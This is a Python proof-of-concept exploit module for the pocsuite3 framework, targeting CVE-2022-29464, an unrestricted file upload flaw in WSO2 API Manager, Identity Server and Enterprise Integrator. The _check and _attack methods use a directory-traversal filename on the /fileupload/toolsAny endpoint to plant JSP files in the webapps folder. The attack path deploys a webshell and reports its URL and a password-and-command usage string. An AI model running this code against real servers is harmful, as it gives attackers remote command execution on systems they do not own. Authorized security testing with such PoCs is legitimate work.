#! /usr/bin/env python3
# coding:utf-8

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from urllib3 import encode_multipart_formdata


class TestPOC(POCBase):
    vulID = 'CVE-2022-29464'  # ssvid
    version = '2.0'
    author = ['seebug']
    vulDate = '2022-04-23'
    createDate = '2022-04-24'
    updateDate = '2022-04-24'
    references = ['https://github.com/hakivvi/CVE-2022-29464', 'https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738']
    name = 'WSO2 API Manager 文件上传漏洞（CVE-2022-29464）'
    appPowerLink = 'https://wso2.com/'
    appName = 'WSO2 API Manager'
    appVersion = '2.2.0 <= version <= 4.0.0'
    vulType = 'File Upload'
    desc = '''某些WSO2产品允许不受限制的文件上传，从而导致远程代码执行。
    攻击者必须使用带有Content-Disposition目录遍历序列的/fileupload端点，
    以到达网络根目录下，如./././repository/deployment/server/webapps目录。
    这影响了:
      WSO2 API Manager 2.2.0及以上至4.0.0；
      WSO2 Identity Server 5.2.0及以上至5.11.0；
      WSO2 Identity Server Analytics 5.4.0、5.4.1、5.5.0和5.6.0；
      WSO2 Identity Server as Key Manager 5.3.0及以上至5.10.0；
      WSO2 Enterprise Integrator 6.2.0及以上至6.6.0。'''
    # dork = {'zoomeye': 'app:"VMware vCenter"'}
    suricata_request = ''''''
    suricata_response = ''''''
    samples = ['']
    install_requires = ['']

    def _check(self):
        self.url = self.url.rstrip('/')
        self.target_path = '../../../../repository/deployment/server/webapps/authenticationendpoint/hello.jsp'

        try:
            datas = {}
            headers = {}
            datas[self.target_path] = ('hello.jsp', open('data/webshell/jsp/hello.jsp', 'rb').read())
            encode_data = encode_multipart_formdata(datas)
            datas = encode_data[0]
            headers['Content-Type'] = encode_data[1]

            rep = requests.post(self.url + "/fileupload/toolsAny",
                                headers=headers,
                                data=datas)
            if rep.status_code == 200:
                rep1 = requests.post(self.url + '/authenticationendpoint/hello.jsp')
                if rep1.status_code == 200 and \
                    'Hello,this is a document.So whassup this weekend.I gonna go hiking.' in rep1.text:
                    return True
        except Exception as e:
            logger.error(e)

        return False

    def attack_check(self):
        proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }

        self.url = self.url.rstrip('/')
        self.webshell_name = 'noshell1.jsp'
        self.target_path = '../../../../repository/deployment/server/webapps/authenticationendpoint/' + self.webshell_name
        try:
            datas = {}
            headers = {}
            datas[self.target_path] = (self.webshell_name, open('data/webshell/jsp/noshell1.jsp', 'rb').read())
            encode_data = encode_multipart_formdata(datas)
            datas = encode_data[0]
            headers['Content-Type'] = encode_data[1]

            rep = requests.post(self.url + "/fileupload/toolsAny",
                                headers=headers,
                                data=datas, proxies=proxies)
            if rep.status_code == 200:
                return True

        except Exception as e:
            logger.error(e)

    def _verify(self):
        result = {}
        if self._check():
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Check result'] = 'The website is vulnerable!!!'
            result['VerifyInfo']['PoC url'] = self.url + '/authenticationendpoint/hello.jsp'
        return self.parse_output(result)

    def _attack(self):
        result = {}
        if self.attack_check():
            result['ShellInfo'] = {}
            result['ShellInfo']['Webshell URL'] = self.url + '/authenticationendpoint/{0}'.format(self.webshell_name)
            result['ShellInfo']['Webshell Usage'] = 'pwd=shaqima&cmd=<command>'
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
